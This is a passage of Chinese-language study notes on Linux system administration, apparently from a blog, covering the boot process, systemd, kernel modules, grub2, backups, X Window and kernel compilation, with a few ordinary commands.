id="19-1-Linux-的启动流程分析"><a href="#19-1-Linux-的启动流程分析" class="headerlink" title="19.1 Linux 的启动流程分析"></a>19.1 Linux 的启动流程分析</h2><h3 id="19-1-1-启动流程一览"><a href="#19-1-1-启动流程一览" class="headerlink" title="19.1.1 启动流程一览"></a>19.1.1 启动流程一览</h3><p>Boot loader 可以指定使用哪个内核文件来启动，并实际加载到内核中解压缩与执行。此时内核就能够开始在内存中活动，并检测所有硬件信息与加载适当的驱动程序来使整台主机开始运行，等到内核检测硬件与加载驱动程序完毕后，操作系统便开始运行.</p><h3 id="19-1-2-BIOS-boot-loader-与-kernel-加载"><a href="#19-1-2-BIOS-boot-loader-与-kernel-加载" class="headerlink" title="19.1.2 BIOS, boot loader 与 kernel 加载"></a>19.1.2 BIOS, boot loader 与 kernel 加载</h3><p>BIOS, 无论传统 BIOS 还是 UEFI BIOS 都会被简称为 BIOS.</p><p>在个人计算机架构下，启动整个系统首先就要让系统去加载 BIOS (Basic Input Output System), 并通过 BIOS 程序去加载 CMOS 信息，并且借由 CMOS 内的设置取得主机的各项硬件配置. 在取得这些信息后，BIOS 会进行启动自我检测 (Power-on Self Test, POST), 然后开始执行硬件检测的初始化，并设置 PnP 设备，之后再定义出可启动的设备顺序，接下来就会开始进行设备的数据读取.</p><p>Boot loader 位于启动设备的第一个扇区中。</p><h4 id="boot-loader-的功能"><a href="#boot-loader-的功能" class="headerlink" title="boot loader 的功能"></a>boot loader 的功能</h4><p>loader 的主要功能是识别操作系统的文件格式.</p><p>由于不同操作系统的文件格式不一致，因此每种操作系统都有自己的 boot loader.</p><p>通常操作系统默认都会安装一份 loader 到它根目录所在文件系统的 boot sector 上.</p><p>boot loader 主要的功能如下:</p><ul><li>提供选项：用户可以选择不同的启动选项, 这也是多重引导的重要功能</li><li>加载内核文件: 直接指向可启动的程序区域来启动操作系统</li><li>转交其他 loader: 将启动管理功能转交给其他 loader 负责</li></ul><p>内核文件一般被放置在 <code>/boot</code> 里，并去名为 <code>/boot/vmlinuz</code>.</p><p>Linux 内核可以通过动态加载内核模块，这些模块放置在 <code>/lib/modules</code> 目录内。</p><p>由于模块放置到磁盘根目录内，因此启动的过程中内核必须要挂在根目录，这样才能够读取内核模块提供的加载驱动程序功能.</p><p>一般来说，Linux 发行版都会将非必要的功能且可以编译成为模块的内核功能，编译成为模块.</p><p>虚拟文件系统 (Initial RAM Filesystem) 一般使用的文件名为 <code>/boot/initrd</code> 或 <code>/boot/initramfs</code>, 这个文件可以通过 boot loader 来加载到内存中，然后这个文件会被解压缩并且在内存中模拟成一个根目录.</p><h3 id="19-1-3-第一个程序-systemd-及使用-default-target-进入启动程序分析"><a href="#19-1-3-第一个程序-systemd-及使用-default-target-进入启动程序分析" class="headerlink" title="19.1.3 第一个程序 systemd 及使用 default.target 进入启动程序分析"></a>19.1.3 第一个程序 systemd 及使用 default.target 进入启动程序分析</h3><p>systemd 最主要的功能就是准备软件执行的环境，包括系统的主机名，网络设置，语言设置，文件系统格式及其他服务的启动等.</p><p>要知道系统服务的启用流程，最简单的方法就是:</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-dependencies</span> <span class="hljs-string">graphical</span>.<span class="hljs-string">target</span><br></code></pre></td></tr></table></figure><h3 id="19-1-4-systemd-执行-sysinit-target-初始化系统，basic-target-准备系统"><a href="#19-1-4-systemd-执行-sysinit-target-初始化系统，basic-target-准备系统" class="headerlink" title="19.1.4 systemd 执行 sysinit.target 初始化系统，basic.target 准备系统"></a>19.1.4 systemd 执行 sysinit.target 初始化系统，basic.target 准备系统</h3><h3 id="19-1-5-systemd-启动-multi-user-target-下的服务"><a href="#19-1-5-systemd-启动-multi-user-target-下的服务" class="headerlink" title="19.1.5 systemd 启动 multi-user.target 下的服务"></a>19.1.5 systemd 启动 multi-user.target 下的服务</h3><p>各种主机服务以及提供服务器功能的网络服务的启动，大多附属与 <code>multi-user.target</code>.</p><p>一般服务的启动脚本设置都放在下面的目录内:</p><ul><li><code>/usr/lib/systemd/system</code> , 系统默认的服务启动脚本设置</li><li><code>/etc/systemd/system</code> , 管理员自己开发与设置的脚本设置</li></ul><p>将服务放到 <code>/etc/systemed/system/multi-user.target.want</code> 下就可以在启动时启动它.</p><p>当系统完成启动后，还想要系统额外执行某些程序的话，可以将程序命令或脚本的绝对路径名称写入到 <code>/etc/rc.d/rc.local</code> 这个文件下。 当 <code>rc.local</code> 具有可执行权限时才会被执行。</p><h4 id="提供-tty-界面与登录服务"><a href="#提供-tty-界面与登录服务" class="headerlink" title="提供 tty 界面与登录服务"></a>提供 tty 界面与登录服务</h4><p><code>multi-user.target</code> 下面的 <code>getty.target</code> 操作界面选项是提供 tty 界面。</p><p>用户登录服务也是在 <code>multi-user.target</code> 下。</p><h3 id="19-1-6-systemd-启动-graphical-target-下面的服务"><a href="#19-1-6-systemd-启动-graphical-target-下面的服务" class="headerlink" title="19.1.6 systemd 启动 graphical.target 下面的服务"></a>19.1.6 systemd 启动 graphical.target 下面的服务</h3><p>如果 <code>default.target</code> 是 <code>multi-user.target</code>，这个步骤就不会执行.</p><h3 id="19-1-7-启动过程会用到的主要配置文件"><a href="#19-1-7-启动过程会用到的主要配置文件" class="headerlink" title="19.1.7 启动过程会用到的主要配置文件"></a>19.1.7 启动过程会用到的主要配置文件</h3><p>几个常见的比较重要的配置文件:</p><h4 id="关于模块-etc-modprobe-d-conf-及-etc-modules-load-d-conf"><a href="#关于模块-etc-modprobe-d-conf-及-etc-modules-load-d-conf" class="headerlink" title="关于模块: /etc/modprobe.d/*.conf 及 /etc/modules-load,d/*.conf"></a>关于模块: <code>/etc/modprobe.d/*.conf</code> 及 <code>/etc/modules-load,d/*.conf</code></h4><ul><li><code>/etc/modprobe.d/*.conf</code> 是可以加上模块参数的位置</li><li><code>/etc/modules-load.d/*.conf</code> 是单纯加载模块的位置</li></ul><p><code>systemctl restart systemd-modules-load.service</code> 可重新加载模块.</p><h2 id="19-2-内核与内核模块"><a href="#19-2-内核与内核模块" class="headerlink" title="19.2 内核与内核模块"></a>19.2 内核与内核模块</h2><p>在整个启动的过程当中，是否能够成功驱动我们的主机的硬件设备是内核 (kernel) 的工作。</p><p>内核一般为压缩文件，因此在使用内核之前，就的要将它解压缩后，才能加载到内存当中.</p><p>内核与模块的存放位置:</p><ul><li>内核: <code>/boot/vmlinuz</code> 或 <code>/boot/vmlinuz-version</code></li><li>内核解压缩所需的 RAM Disk: <code>/boot/inistramfs</code> 或 <code>/boot/inistramfs-version</code></li><li>内核模块: <code>/lib/modules/version/kernel</code> 或 <code>/lib/modules/$(uname -r)/kernel</code></li><li>内核源代码: <code>/usr/src/linux</code> 或 <code>/usr/src/kernels</code> (默认不安装)</li></ul><p>添加新硬件支持:</p><ul><li>重新编译内核，并加入最新的硬件驱动程序源代码</li><li>将该硬件的驱动程序编译成为模块，在启动时加载该模块</li></ul><h3 id="19-2-1-内核模块与依赖性"><a href="#19-2-1-内核模块与依赖性" class="headerlink" title="19.2.1 内核模块与依赖性"></a>19.2.1 内核模块与依赖性</h3><p>检查 <code>/lib/modules/$(uname -r)/modules.dep</code> 这个文件，其记录了内核支持的模块的各项依赖性.</p><p>使用 <code>depmod</code> 命令之后，该程序会跑到模块标准放置目录 <code>/lib/modules/$(uname -r)/kernel</code>，并一句相关目录的定义将全部的模块读取出来分析，最终将分析的结果写入 <code>modules.dep</code> 文件中.</p><h4 id="19-2-2-查看内核模块"><a href="#19-2-2-查看内核模块" class="headerlink" title="19.2.2 查看内核模块"></a>19.2.2 查看内核模块</h4><p>使用 <code>lsmod</code> 命令可以查看目前内核加载了多少模块.</p><p>显示的内容包括:</p><ul><li>模块名称 (Module)</li><li>模块的大小 (Size)</li><li>次模块是否被其他模块所使用 (Used by)</li></ul><p>使用 <code>modinfo</code> 命令，可以查看在内核中的模块，也可以查看某个模块文件.</p><h3 id="19-2-3-内核模块的加载与删除"><a href="#19-2-3-内核模块的加载与删除" class="headerlink" title="19.2.3 内核模块的加载与删除"></a>19.2.3 内核模块的加载与删除</h3><p>使用 <code>modprobe</code> 这个命令来加载模块，<code>modprobe</code> 会主动查找 <code>modules.dep</code> 的内容，先解决了模块的依赖性后，才决定需要加载的模块有哪些. 其可加载也可删除.</p><p><code>insmod</code> 需要提供完整文件名的模块。</p><p>内核模块一定是 <code>.ko</code> 结尾的。</p><h3 id="19-2-4-内核模块的额外参数设置-etc-modprobe-d-conf"><a href="#19-2-4-内核模块的额外参数设置-etc-modprobe-d-conf" class="headerlink" title="19.2.4 内核模块的额外参数设置: /etc/modprobe.d/*.conf"></a>19.2.4 内核模块的额外参数设置: <code>/etc/modprobe.d/*.conf</code></h3><h2 id="19-3-Boot-Loader-Grub2"><a href="#19-3-Boot-Loader-Grub2" class="headerlink" title="19.3 Boot Loader: Grub2"></a>19.3 Boot Loader: Grub2</h2><h3 id="19-3-1-boot-loader-的两个-stage"><a href="#19-3-1-boot-loader-的两个-stage" class="headerlink" title="19.3.1 boot loader 的两个 stage"></a>19.3.1 boot loader 的两个 stage</h3><p>在 BIOS 读完信息后，接下来就是回到第一个启动设备的 MBR 去读取 boot loader.</p><p>Linux 将 boot loader 的程序代码执行与设置值加载分成两个阶段 (stage):</p><ul><li>Stage 1: 执行 boot loader 主程序, 这个主程序必须被安装在启动区，即 MBR 或启动扇区 (boot sector)</li><li>Stage 2: 主程序加载配置文件，通过 boot loader 加载所有配置文件与相关的环境参数文件, 一般来说，配置文件都在 <code>/boot</code> 下<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -l <span class="hljs-regexp">/boot/g</span>rub2<br></code></pre></td></tr></table></figure></li></ul><h3 id="19-3-2-grub2-的配置文件-x2F-boot-x2F-grub2-x2F-grub-cfg-初探"><a href="#19-3-2-grub2-的配置文件-x2F-boot-x2F-grub2-x2F-grub-cfg-初探" class="headerlink" title="19.3.2 grub2 的配置文件 &#x2F;boot&#x2F;grub2&#x2F;grub.cfg 初探"></a>19.3.2 grub2 的配置文件 &#x2F;boot&#x2F;grub2&#x2F;grub.cfg 初探</h3><p>grub2 的优点:</p><ul><li>识别与支持较多文件系统，并且可以使用 grub2 的主程序直接在文件系统中查找内核文件</li><li>启动时可以自行编辑与修改启动设置选项，类似 bash 的命令模式</li><li>可以动态查找配置文件，而不需要在修改配置文件后重新安装 grub2</li></ul><h4 id="磁盘与分区在-grub2-中的代号"><a href="#磁盘与分区在-grub2-中的代号" class="headerlink" title="磁盘与分区在 grub2 中的代号"></a>磁盘与分区在 grub2 中的代号</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(hd0,1)</span>     <span class="hljs-attr"># 一般的默认语法，由 grub2</span> 自动判断分区格式<br><span class="hljs-comment">(hd0,msdos1)</span>    <span class="hljs-attr"># 此磁盘的分区为传统的 MBR 模式</span><br><span class="hljs-attr">(hd0</span>,gpt<span class="hljs-number">1</span>)      <span class="hljs-attr"># 此磁盘的分区为 GPT 模式</span><br></code></pre></td></tr></table></figure><p>注意点:</p><ul><li>以查找顺序作为硬盘的编号 </li><li>第一个查找到的硬盘为 0 号，第二个为 1 号</li><li>每快硬盘的第一个分区代号为 1<br>由于 BIOS 可以调整磁盘的启动顺序，所以 <code>hdn</code> 的 <code>n</code> 会变.</li></ul><h3 id="19-3-3-grub2-配置文件维护-etc-default-grub-与-etc-grub-d"><a href="#19-3-3-grub2-配置文件维护-etc-default-grub-与-etc-grub-d" class="headerlink" title="19.3.3 grub2 配置文件维护 /etc/default/grub 与 /etc/grub.d"></a>19.3.3 grub2 配置文件维护 <code>/etc/default/grub</code> 与 <code>/etc/grub.d</code></h3><h3 id="19-3-4-instramfs-的重要性与建立新-initramfs-文件"><a href="#19-3-4-instramfs-的重要性与建立新-initramfs-文件" class="headerlink" title="19.3.4 instramfs 的重要性与建立新 initramfs 文件"></a>19.3.4 instramfs 的重要性与建立新 initramfs 文件</h3><p>initramfs 内所包含的模块大多是与启动过程有关，而主要以文件系统及硬盘模块为主.</p><p>一般来说，需要 initramfs 的时刻为:</p><ul><li>根目录所在磁盘为 SATA, USB 或 SCSI 等接口设备</li><li>根目录所在文件系统为 LVM, RAID 等特殊格式</li><li>根目录所在文件系统为非传统 Linux 支持的文件系统</li><li>其他必须要内核加载时提供的模块</li></ul><h3 id="19-3-5-测试与安装-grub2"><a href="#19-3-5-测试与安装-grub2" class="headerlink" title="19.3.5 测试与安装 grub2"></a>19.3.5 测试与安装 grub2</h3><h3 id="19-3-6-启动钱的额外功能修改"><a href="#19-3-6-启动钱的额外功能修改" class="headerlink" title="19.3.6 启动钱的额外功能修改"></a>19.3.6 启动钱的额外功能修改</h3><p>选项部分的画面就是 menuentry 后面的文字.</p><h3 id="19-3-7-关于启动画面与终端画面的图形显示方式"><a href="#19-3-7-关于启动画面与终端画面的图形显示方式" class="headerlink" title="19.3.7 关于启动画面与终端画面的图形显示方式"></a>19.3.7 关于启动画面与终端画面的图形显示方式</h3><h2 id="19-4-启动过程的问题解决"><a href="#19-4-启动过程的问题解决" class="headerlink" title="19.4 启动过程的问题解决"></a>19.4 启动过程的问题解决</h2><p>Linux 无法顺利启动时，可进入 rescue 模式去处理.</p><h3 id="19-4-1-忘记-root-密码的解决之道"><a href="#19-4-1-忘记-root-密码的解决之道" class="headerlink" title="19.4.1 忘记 root 密码的解决之道"></a>19.4.1 忘记 root 密码的解决之道</h3><h3 id="19-4-2-直接启动就以-root-执行-bash-的方法"><a href="#19-4-2-直接启动就以-root-执行-bash-的方法" class="headerlink" title="19.4.2 直接启动就以 root 执行 bash 的方法"></a>19.4.2 直接启动就以 root 执行 bash 的方法</h3><h1 id="第20章-基础系统设置与备份策略"><a href="#第20章-基础系统设置与备份策略" class="headerlink" title="第20章 基础系统设置与备份策略"></a>第20章 基础系统设置与备份策略</h1><h2 id="20-1-系统基本设置"><a href="#20-1-系统基本设置" class="headerlink" title="20.1 系统基本设置"></a>20.1 系统基本设置</h2><p>使用 <code>hwclock</code> 是将正确时间写入 BIOS 时间记录.</p><p>使用 <code>ntpdate</code> 手动校时：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ntpdate s2m<span class="hljs-selector-class">.time</span><span class="hljs-selector-class">.edu</span>.cn<br></code></pre></td></tr></table></figure><p><code>s2m.time.edu.cn</code> 是北京大学提供的时间服务器.</p><h3 id="20-1-3-语系设置"><a href="#20-1-3-语系设置" class="headerlink" title="20.1.3 语系设置"></a>20.1.3 语系设置</h3><p><code>/etc/locale.conf</code> 是语系的配置文件，可以用 <code>localectl</code> 来查看目前的系统语系:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">localectl</span><br></code></pre></td></tr></table></figure><h3 id="20-1-4-防火墙建议设置"><a href="#20-1-4-防火墙建议设置" class="headerlink" title="20.1.4 防火墙建议设置"></a>20.1.4 防火墙建议设置</h3><p>防火墙是一种网络数据的过滤方式，它可以根据你服务器启动的服务来设置是否开放，也能够针对对你信任的用户开放.</p><p>相关设置项目:</p><ul><li>服务</li><li>端口</li><li>富规则 (rich rule)</li><li>接口 : 就是这个区域主要是针对那一个网卡来做规范, 如 eth0</li></ul><h2 id="20-2-服务器硬件数据的收集"><a href="#20-2-服务器硬件数据的收集" class="headerlink" title="20.2 服务器硬件数据的收集"></a>20.2 服务器硬件数据的收集</h2><h3 id="20-2-1-使用-dmidecode-查看硬件设备"><a href="#20-2-1-使用-dmidecode-查看硬件设备" class="headerlink" title="20.2.1 使用 dmidecode 查看硬件设备"></a>20.2.1 使用 dmidecode 查看硬件设备</h3><p>dmidecode 可用于查看 CPU 型号，主板型号与内存相关的型号等.</p><p>语法:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">dmidecode</span> -t <span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p>选项:</p><ul><li>1 : 详细的系统信息，含主板的型号与硬件的基础信息等</li><li>4 : CPU 的相关信息，包括倍频，外频，内核数，内核线程数等</li><li>9 : 系统的相关插槽格式，包括 PCI, PCI-E 等的插槽规格说明</li><li>17 : 每一个内存插槽的规格，若有内存, 则列出该内存的容量与型号</li></ul><h3 id="20-2-2-硬件资源的收集与分析"><a href="#20-2-2-硬件资源的收集与分析" class="headerlink" title="20.2.2 硬件资源的收集与分析"></a>20.2.2 硬件资源的收集与分析</h3><p>内核所检测到的各项硬件设备，会被记录在 <code>/proc</code> 和 <code>/sys</code> 当中.</p><p><code>lspci</code>, <code>lsusb</code>, <code>iostat</code> 命令.</p><p><code>lspci</code> 的所有数据都是从 <code>/proc/bus/pci</code> 目录中获取。</p><p>在线更新对应文件:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">update-pciids</span><br></code></pre></td></tr></table></figure><p><code>lostat</code> 可用 <code>sudo pacman -S sysstat</code> 来安装.</p><h3 id="20-2-3-了解磁盘的健康状态"><a href="#20-2-3-了解磁盘的健康状态" class="headerlink" title="20.2.3 了解磁盘的健康状态"></a>20.2.3 了解磁盘的健康状态</h3><p>smartd 服务, SMART 是 Self-Monitoring, Analysis and Reporting Technology System 的缩写.</p><p>需要被检测的磁盘支持 SMART 协议.</p><p>smartd 提供一个命令 <code>smartctl</code>.</p><h2 id="20-3-备份要点"><a href="#20-3-备份要点" class="headerlink" title="20.3 备份要点"></a>20.3 备份要点</h2><h3 id="20-3-1-备份数据的考虑"><a href="#20-3-1-备份数据的考虑" class="headerlink" title="20.3.1 备份数据的考虑"></a>20.3.1 备份数据的考虑</h3><h3 id="20-3-2-哪些-Linux-数据具有备份的意义"><a href="#20-3-2-哪些-Linux-数据具有备份的意义" class="headerlink" title="20.3.2 哪些 Linux 数据具有备份的意义"></a>20.3.2 哪些 Linux 数据具有备份的意义</h3><p>通常粗分为两大类:</p><ul><li>系统基本设置信息</li><li>类似网络服务的内容数据</li></ul><h4 id="操作系统本身需要备份的文件"><a href="#操作系统本身需要备份的文件" class="headerlink" title="操作系统本身需要备份的文件"></a>操作系统本身需要备份的文件</h4><p>主要跟 <mark>帐号与系统配置文件</mark> 有关, 包括 <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/group</code>, <code>/etc/gshadow</code> 以及 <code>/home</code> 下的用户家目录，一般将 <code>/etc</code> 目录备份下来，几乎所有的配置文件都可以被保存.</p><p>用户的邮件，<code>/var/spool/mail</code> 内容也需要备份.</p><ul><li><code>/etc/</code> 整个目录</li><li><code>/home/</code> 整个目录</li><li><code>/var/spool/mail/</code></li><li><code>/var/spool/&#123;at/cron&#125;/</code></li><li><code>/boot/</code></li><li><code>/root/</code></li><li><code>/usr/local/</code> 或 <code>/opt</code></li></ul><h4 id="网络服务的数据库方面"><a href="#网络服务的数据库方面" class="headerlink" title="网络服务的数据库方面"></a>网络服务的数据库方面</h4><ul><li>软件本身的配置文件, 如 <code>/etc/</code> 整个目录，<code>/usr/local</code> 整个目录</li><li>软件服务提供的数据，以 WWW 为例: <code>/var/www</code> 整个目录或 <code>/srv/www</code> 整个目录</li></ul><h4 id="推荐备份的目录"><a href="#推荐备份的目录" class="headerlink" title="推荐备份的目录"></a>推荐备份的目录</h4><ul><li><code>/etc/</code></li><li><code>/home/</code></li><li><code>/root/</code></li><li><code>/var/spool/mail/</code>, <code>/var/spool/cron/</code>, <code>/var/spool/at/</code></li><li><code>/var/lib/</code></li></ul><h4 id="不需要备份的目录"><a href="#不需要备份的目录" class="headerlink" title="不需要备份的目录"></a>不需要备份的目录</h4><ul><li>&#x2F;dev</li><li>&#x2F;proc, &#x2F;sys, &#x2F;run</li><li>&#x2F;mnt, &#x2F;media</li><li>&#x2F;tmp</li></ul><h2 id="20-4-备份的种类，频率与工具的选择"><a href="#20-4-备份的种类，频率与工具的选择" class="headerlink" title="20.4 备份的种类，频率与工具的选择"></a>20.4 备份的种类，频率与工具的选择</h2><h3 id="20-4-1-完备备份之累积备份-incremental-backup"><a href="#20-4-1-完备备份之累积备份-incremental-backup" class="headerlink" title="20.4.1 完备备份之累积备份 (incremental backup)"></a>20.4.1 完备备份之累积备份 (incremental backup)</h3><p>即将根目录 (&#x2F;) 整个系统都备份下来.</p><p>累计备份指在系统进行完第一次完整备份后，经过一段时间的运行，比较系统与备份文件之间的差异，仅备份有差异的文件.</p><h4 id="累积备份使用的备份软件"><a href="#累积备份使用的备份软件" class="headerlink" title="累积备份使用的备份软件"></a>累积备份使用的备份软件</h4><p>常见的有 dd, cpio, xfsdump&#x2F;sfsrestore 等.</p><p>dd 可以直接读取磁盘的扇区而不理会文件系统，缺点是速度较慢. 其需要使用额外的脚本程序处理.</p><p>xfsdump 可直接进行累积备份</p><p>tar 命令也可用于备份. 常配合 date 命令</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">tar -jpcvf mysql.`date +<span class="hljs-built_in">%Y</span>-<span class="hljs-built_in">%m</span>-<span class="hljs-built_in">%d</span>`.tar.bz2 /var/lib/mysql<br></code></pre></td></tr></table></figure><p>可将备份用脚本配合 crontab 去执行.</p><h3 id="20-4-2-完整备份之差异备份-Differential-backup"><a href="#20-4-2-完整备份之差异备份-Differential-backup" class="headerlink" title="20.4.2 完整备份之差异备份 (Differential backup)"></a>20.4.2 完整备份之差异备份 (Differential backup)</h3><h2 id="20-5-鸟哥的备份策略"><a href="#20-5-鸟哥的备份策略" class="headerlink" title="20.5 鸟哥的备份策略"></a>20.5 鸟哥的备份策略</h2><h1 id="第23章-X-Window-设置介绍"><a href="#第23章-X-Window-设置介绍" class="headerlink" title="第23章 X Window 设置介绍"></a>第23章 X Window 设置介绍</h1><p>Linux 上的图形用户界面模式称为 X Window System. 其对于 Linux 来说只是一个软件。</p><h2 id="23-1-什么是-X-Window-System"><a href="#23-1-什么是-X-Window-System" class="headerlink" title="23.1 什么是 X Window System"></a>23.1 什么是 X Window System</h2><p>名称由来, X 在英文顺序的 W(indow) 后面，有下一代的新窗口之意。因此叫做 X Window System.</p><h3 id="23-1-1-X-Window-System-的发展简史"><a href="#23-1-1-X-Window-System-的发展简史" class="headerlink" title="23.1.1 X Window System 的发展简史"></a>23.1.1 X Window System 的发展简史</h3><p>在 UNIX-like 上面的图形用户接口(GUI)被称为 X 或 X11.</p><h3 id="23-1-2-主要组件-X-Server-x2F-X-Client-x2F-Window-Manager-Display-Manager"><a href="#23-1-2-主要组件-X-Server-x2F-X-Client-x2F-Window-Manager-Display-Manager" class="headerlink" title="23.1.2 主要组件: X Server&#x2F;X Client&#x2F;Window Manager?Display Manager"></a>23.1.2 主要组件: X Server&#x2F;X Client&#x2F;Window Manager?Display Manager</h3><p>X Window System 是基于网络架构的GUI. 意思就是 X Client 从网络上获取需求，X Server 来呈现(即绘制图像)。需要网络提供数据。</p><p>基本可以分成 X Server 和 X Client 两个组件。</p><p>X Server 管理硬件，X Client 是应用程序。</p><p>具体内容:</p><ul><li>X Server, 负责硬件管理、屏幕绘制与提供字体功能。其管理的设备包括: 键盘、鼠标、手写板、显示器、屏幕分辨率与色彩深度、显卡(包括驱动程序)与显示字体等。<br>X Window System 是软件，有自己的配置文件，其设置与 Linux 不一定相同。</li></ul><p>每台客户端主机都需要安装 X Server, 而服务器则是提供 X Client 软件，以提供客户端绘图所需要的数据。</p><ul><li>X Client, 负责 X Server 要求的事件的处理. 其主要工作为处理来自 X Server 的操作，将该操作处理为绘图数据，再将这些绘图数据传回给 X Server. 每个 X Client 并不知道其他 X Client 的存在。</li></ul><p><mark>X Window Manager</mark>: 特殊的 X Client, 负责管理所有的 X Client 软件。</p><p><mark>Display Manager</mark>: 提供登录需求。如 GNOME 的 gdm(GNOME Display Manager).</p><h3 id="23-1-3-X-Window-System-的启动流程"><a href="#23-1-3-X-Window-System-的启动流程" class="headerlink" title="23.1.3 X Window System 的启动流程"></a>23.1.3 X Window System 的启动流程</h3><p>要启动 X Window System, 首先要启动管理硬件和绘图的 X Server, 然后才加载 X Client.</p><p>可在命令行输入 <code>startx</code> 来启动 X 窗口。</p><p>startx 是一个 shell 脚本，会主动帮忙用户建立他们的 X 所需要引用的配置文件。</p><p>语法:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ startx [X <span class="hljs-built_in">Client</span> 参数] -- [X <span class="hljs-built_in">Server</span> 参数]<br></code></pre></td></tr></table></figure><p>startx 最重要的任务是找到用户或是系统默认的 X Server 与 X Client 的配置文件。用户能通过外接参数来修改配置文件的内容。      </p><p>实际上启动 X 的是 xinit 这个程序，startx 仅找出设置值。</p><p>xinit 的语法:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">xinit [<span class="hljs-keyword">client</span> option] -- [<span class="hljs-keyword">server</span> or <span class="hljs-keyword">display</span> option]<br></code></pre></td></tr></table></figure><p>默认情况下，输入 <code>startx</code> 等于 <code>xinit /etc/X11/xinit/xinitrc -- /etc/X11/xinit/xserverrc</code></p><p>xinit 主要在启动 X Server 和加载 X Client, 但这个 xinit 所需要的参数是由 startx 帮忙查找。</p><p>X 启动的时候可以指定启动的接口。</p><p>在 X Window System 的环境下，称 6000 端口为第 0 个显示接口，即 hostname:0. 通常写为 <code>:0</code></p><h3 id="23-1-4-X-启动流程测试"><a href="#23-1-4-X-启动流程测试" class="headerlink" title="23.1.4 X 启动流程测试"></a>23.1.4 X 启动流程测试</h3><h1 id="第24章-Linux-内核编译与管理"><a href="#第24章-Linux-内核编译与管理" class="headerlink" title="第24章 Linux 内核编译与管理"></a>第24章 Linux 内核编译与管理</h1><p>内核控制主机的所有硬件并提供系统所有的功能.</p><p>内核 (kernel) 是整个操作系统的最底层, 它负责整个硬件的驱动, 以及提供各种系统所需的内核功能, 包括防火墙功能, 是否支持 LVM 或磁盘配额等文件系统功能.</p><p>想要让计算机完成的工作, 都需要通过内核的帮助. 想要让计算机完成的工作, 都必须要有内核支持才可以.</p><p>内核本质上就是一个文件, 其包含了驱动主机各项硬件的检测程序与驱动模块.</p><p>这个内核文件通常被命名为 <code>vmlinuz-xxx</code>, 有时也不一定, 因为一台主机上面可以拥有多个内核文件, 只是启动的时候仅能选择一个来加载.</p><p>什么是内核模块 (kernel module) ? 也就是 Linux 的模块化设置, 由于硬件更新快, 需要不断添加. 将类似驱动的东西独立出内核, 编译成模块, 然后内核可以在系统正常运行的过程当中加载这个模块, 这样就能在不需要修改内核的前提下, 只需要编译出适当的模块, 并加载它.</p><p>模块放在 <code>/lib/modules/(uname -r)/kernel</code> 中.</p><h3 id="24-1-2-更新内核的目的"><a href="#24-1-2-更新内核的目的" class="headerlink" title="24.1.2 更新内核的目的"></a>24.1.2 更新内核的目的</h3><p>除了 BIOS (或 UEFI) 之外, 内核是操作系统最早被加载到内存的东西, 它包含了所有可以让硬件和软件工作的信息.</p><p>可重新编译内核来去除掉很多用不到的功能.</p><p>内核的主要工作就是管理硬件.</p><p>获取最新稳定版内核代码:</p><ul><li><a href="http://www.kernel.org/">内核官网</a></li><li><a href="http://centos.ustc.edu.cn/linux-kernel/">中科大镜像站</a></li><li><a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">清华大学镜像站</a></li></ul><h4 id="保存原本设置-利用-patch-升级内核源代码"><a href="#保存原本设置-利用-patch-升级内核源代码" class="headerlink" title="保存原本设置: 利用 patch 升级内核源代码"></a>保存原本设置: 利用 patch 升级内核源代码</h4><p>每次内核发布时, 除了发布完整的内核压缩文件之外, 也会发布该版本与前一版本的差异性 patch 文件. 每个内核的 patch 仅有针对前一版的内核来分析.</p><h3 id="24-1-5-内核源代码的解压缩-安装-查看"><a href="#24-1-5-内核源代码的解压缩-安装-查看" class="headerlink" title="24.1.5 内核源代码的解压缩, 安装, 查看"></a>24.1.5 内核源代码的解压缩, 安装, 查看</h3><p>Linux 内核文件一般建议放在 <code>/usr/src/kernels/</code> 下.</p><p>其中的 <code>Documentation</code> 目录下有说明.</p><h2 id="24-2-内核编译前的预处理与内核功能选择"><a href="#24-2-内核编译前的预处理与内核功能选择" class="headerlink" title="24.2 内核编译前的预处理与内核功能选择"></a>24.2 内核编译前的预处理与内核功能选择</h2><p>整个内核编译的重要工作就是选择你想要的功能.</p><h3 id="24-2-1-硬件环境查看与内核功能要求"><a href="#24-2-1-硬件环境查看与内核功能要求" class="headerlink" title="24.2.1 硬件环境查看与内核功能要求"></a>24.2.1 硬件环境查看与内核功能要求</h3><h3 id="24-2-2-保持干净源代码-make-mrproper"><a href="#24-2-2-保持干净源代码-make-mrproper" class="headerlink" title="24.2.2 保持干净源代码: make mrproper"></a>24.2.2 保持干净源代码: make mrproper</h3><p>处理掉编译过程的目标文件 (<code>*.o</code>) 以及配置文件.</p><p>进入内核所在目录后:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make mrproper</span><br></code></pre></td></tr></table></figure><p>其会将内核功能选择文件也删除, 因此一般在内核编译之前进行这个操作.</p><p>删除目标文件之类的编译过程产生的中间文件:</p><figure class="highlight 